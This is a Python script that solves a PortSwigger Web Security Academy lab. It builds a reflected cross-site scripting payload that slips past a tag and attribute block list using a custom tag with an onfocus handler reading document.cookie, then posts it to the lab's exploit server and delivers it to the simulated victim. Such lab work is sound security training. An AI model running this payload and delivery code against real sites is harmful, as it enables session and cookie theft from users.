# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
import requests

requests.packages.urllib3.disable_warnings()

verify = False
proxy = "127.0.0.1:8080"
scheme = "https://"
proxies = {scheme: proxy}
host = "ac6b1f491eaaf06380736bd1008f004f.web-security-academy.net"
lab_url_endpoint = scheme + host

exploit_url_endpoint = (
    scheme + "ac5f1fb11e53f0cb800d6bfa012e0012.web-security-academy.net"
)
payload = f"<script>location = '{lab_url_endpoint}?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';</script>"
# payload = f"<script>location = '{lab_url_endpoint}?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';"

# Url encoded payload (incorrect):
# <textarea required rows="12" cols="300" name="responseBody">&lt;script&gt;location = &apos;https://ac6b1f491eaaf06380736bd1008f004f.web-security-academy.net?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x&apos;;</textarea>

# No url encoding, but the output is html encoded? And somehow this still works?
# <textarea required rows="12" cols="300" name="responseBody">&lt;script&gt;location = &apos;https://ac6b1f491eaaf06380736bd1008f004f.web-security-academy.net?search=&lt;xss id=x onfocus=alert(document.cookie) tabindex=1&gt;#x&apos;;&lt;/script&gt;</textarea>

# Equivalent of clicking the store button on the exploit page
data = {
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK?",
    "Content-Type": "text/html; charset=utf-8",
    "responseBody": payload,
    "formAction": "STORE",
}
requests.post(url=exploit_url_endpoint, verify=verify, proxies=proxies, data=data)

# Equivalent of clicking the deliver to victim button on the exploit page
data["formAction"] = "DELIVER_TO_VICTIM"
requests.post(url=exploit_url_endpoint, verify=verify, proxies=proxies, data=data)
